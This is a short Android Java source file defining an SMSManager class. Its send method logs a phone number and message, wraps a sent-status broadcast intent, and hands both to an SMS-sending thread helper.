package android.app.sms.manager;

import java.util.ArrayList;
import android.app.PendingIntent;
import android.app.sms.async.SendSMSThreed;
import android.app.sms.utils.LogUtils;
import android.content.Context;
import android.content.Intent;

/**
 * 短信发送类
 * @author Stevem
 *
 */
public class SMSManager {
	
	public static void send(Context context, String phone, String content) {
		Intent sentIntent = new Intent("SENT_SMS_ACTION"); 
		LogUtils.write("Send", "广播 " + phone + "--" + content);
		sentIntent.putExtra("phone", "号码" + phone + ", 内容" + content);
		PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent,PendingIntent.FLAG_UPDATE_CURRENT);
		ArrayList<PendingIntent> arrays=new ArrayList<PendingIntent>();
		arrays.add(sentPI);
		SendSMSThreed.startSendSMS(arrays, phone, content);
    }
	
}
